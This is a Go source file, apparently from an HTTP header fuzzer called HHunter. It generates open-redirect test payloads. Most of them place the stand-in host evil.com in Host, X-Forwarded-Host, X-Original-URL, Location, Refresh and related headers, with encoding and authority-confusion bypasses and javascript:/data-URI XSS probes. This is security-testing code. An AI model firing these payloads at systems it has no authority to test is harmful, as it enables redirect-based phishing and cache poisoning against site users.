package headers

import "github.com/cc1a2b/HHunter/engine"

func GetRedirectMutations() []engine.Mutation {
	mutations := []engine.Mutation{}

	evilDomain := "evil.com"

	// Headers that can influence redirect behavior
	redirectHeaders := []struct {
		header string
		values []struct {
			value  string
			impact string
		}
	}{
		{
			"X-Forwarded-Host",
			[]struct {
				value  string
				impact string
			}{
				{evilDomain, "Open redirect via X-Forwarded-Host"},
				{evilDomain + ":443", "Open redirect with port"},
				{evilDomain + "/path", "Open redirect with path"},
				{"@" + evilDomain, "Open redirect via @ authority override"},
				{evilDomain + "%23.target.com", "Fragment-based domain confusion"},
			},
		},
		{
			"X-Original-URL",
			[]struct {
				value  string
				impact string
			}{
				{"https://" + evilDomain, "Redirect via X-Original-URL"},
				{"//" + evilDomain, "Protocol-relative redirect"},
				{"///" + evilDomain, "Triple-slash redirect bypass"},
				{"/.." + evilDomain, "Path traversal redirect"},
				{"/\\" + evilDomain, "Backslash redirect bypass"},
			},
		},
		{
			"X-Rewrite-URL",
			[]struct {
				value  string
				impact string
			}{
				{"https://" + evilDomain, "Redirect via X-Rewrite-URL"},
				{"//" + evilDomain, "Protocol-relative redirect via rewrite"},
				{"/redirect?url=https://" + evilDomain, "Redirect chain via URL rewrite"},
			},
		},
		{
			"Referer",
			[]struct {
				value  string
				impact string
			}{
				{"https://" + evilDomain, "Redirect via Referer header"},
				{"https://" + evilDomain + "/callback", "Callback redirect via Referer"},
			},
		},
		{
			"X-Forwarded-Proto",
			[]struct {
				value  string
				impact string
			}{
				{"http", "Force HTTP — redirect loop or downgrade"},
				{"https", "Force HTTPS — may trigger redirect"},
				{"ftp", "Force FTP protocol — unusual redirect"},
			},
		},
		{
			"X-Forwarded-Scheme",
			[]struct {
				value  string
				impact string
			}{
				{"http", "Scheme downgrade via X-Forwarded-Scheme"},
				{"nope", "Invalid scheme — error-based redirect"},
			},
		},
		{
			"X-Forwarded-Port",
			[]struct {
				value  string
				impact string
			}{
				{"80", "Port 80 — may trigger HTTP redirect"},
				{"8080", "Non-standard port redirect"},
				{"443", "Port 443 — may trigger HTTPS redirect"},
			},
		},
		{
			"Host",
			[]struct {
				value  string
				impact string
			}{
				{evilDomain, "Redirect via Host header override"},
				{evilDomain + ":80", "Redirect via Host with port 80"},
				{"target.com@" + evilDomain, "Host with @ — authority confusion"},
				{"target.com%00." + evilDomain, "Null byte host override"},
			},
		},
	}

	for _, rh := range redirectHeaders {
		for _, v := range rh.values {
			mutations = append(mutations, engine.Mutation{
				Header:   rh.header,
				Value:    v.value,
				Category: "Redirect",
				Impact:   v.impact,
			})
		}
	}

	// Destination/Location override headers
	destHeaders := []struct {
		header string
		value  string
		impact string
	}{
		{"Destination", "https://" + evilDomain, "WebDAV Destination redirect"},
		{"X-Redirect-URL", "https://" + evilDomain, "Redirect via X-Redirect-URL"},
		{"X-Redirect-To", "https://" + evilDomain, "Redirect via X-Redirect-To"},
		{"X-Target-URL", "https://" + evilDomain, "Redirect via X-Target-URL"},
		{"X-Forwarded-Redirect", "https://" + evilDomain, "Redirect via X-Forwarded-Redirect"},
		{"X-Original-Redirect", "https://" + evilDomain, "Redirect via X-Original-Redirect"},
		{"X-Return-URL", "https://" + evilDomain, "Redirect via X-Return-URL"},
		{"X-Callback-URL", "https://" + evilDomain, "Callback redirect"},
		{"X-Success-URL", "https://" + evilDomain, "Success redirect override"},
		{"X-Error-URL", "https://" + evilDomain, "Error redirect override"},
		{"X-Logout-URL", "https://" + evilDomain, "Logout redirect override"},
		{"X-Login-URL", "https://" + evilDomain, "Login redirect override"},
		{"Location", "https://" + evilDomain, "Direct Location header injection"},
		{"Refresh", "0; url=https://" + evilDomain, "Refresh header redirect"},
		{"Content-Location", "https://" + evilDomain, "Content-Location redirect"},
	}

	for _, dh := range destHeaders {
		mutations = append(mutations, engine.Mutation{
			Header:   dh.header,
			Value:    dh.value,
			Category: "Redirect",
			Impact:   dh.impact,
		})
	}

	// Open redirect bypass techniques
	bypassPayloads := []struct {
		value  string
		impact string
	}{
		{"//" + evilDomain, "Protocol-relative redirect"},
		{"///" + evilDomain, "Triple-slash bypass"},
		{"/\\" + evilDomain, "Backslash bypass"},
		{"/%2f" + evilDomain, "Encoded slash bypass"},
		{"/." + evilDomain, "Dot prefix bypass"},
		{"/%09/" + evilDomain, "Tab character bypass"},
		{"/;" + evilDomain, "Semicolon bypass"},
		{"https://target.com@" + evilDomain, "Authority section bypass"},
		{"https://target.com%40" + evilDomain, "Encoded @ bypass"},
		{"https://" + evilDomain + "%252f%252ftarget.com", "Double-encoded slash bypass"},
		{"https://" + evilDomain + "?.target.com", "Question mark bypass"},
		{"https://" + evilDomain + "#.target.com", "Fragment bypass"},
		{"javascript:alert(1)", "JavaScript protocol redirect"},
		{"data:text/html,<script>alert(1)</script>", "Data URI redirect"},
	}

	bypassHeaders := []string{"X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL"}
	for _, header := range bypassHeaders {
		for _, bp := range bypassPayloads {
			mutations = append(mutations, engine.Mutation{
				Header:   header,
				Value:    bp.value,
				Category: "Redirect",
				Impact:   "Open redirect bypass: " + bp.impact,
			})
		}
	}

	return mutations
}
